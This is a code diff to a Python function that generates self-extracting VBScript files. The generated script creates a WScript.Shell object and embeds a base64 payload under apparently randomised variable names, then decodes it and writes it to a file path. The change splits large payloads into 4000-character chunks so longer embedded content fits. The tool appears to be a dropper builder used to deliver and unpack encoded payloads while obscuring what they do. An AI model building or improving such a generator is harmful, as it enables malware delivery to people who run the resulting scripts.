@@ -214,7 +214,16 @@ def generate_self_extracting_vbs(
     main_lines.append(f'')
     main_lines.append(f'Set {v_shell} = CreateObject("WScript.Shell")')
     main_lines.append(f'')
-    main_lines.append(f'{v_b64} = "{base64_data}"')
+
+    chunk_size = 4000
+    if len(base64_data) <= chunk_size:
+        main_lines.append(f'{v_b64} = "{base64_data}"')
+    else:
+        main_lines.append(f'{v_b64} = ""')
+        for i in range(0, len(base64_data), chunk_size):
+            chunk = base64_data[i:i + chunk_size]
+            main_lines.append(f'{v_b64} = {v_b64} & "{chunk}"')
+
     main_lines.append(f'{v_decoded} = {fn_decode}({v_b64})')
     main_lines.append(f'')
     main_lines.append(f'{v_filepath} = {path_expr}')
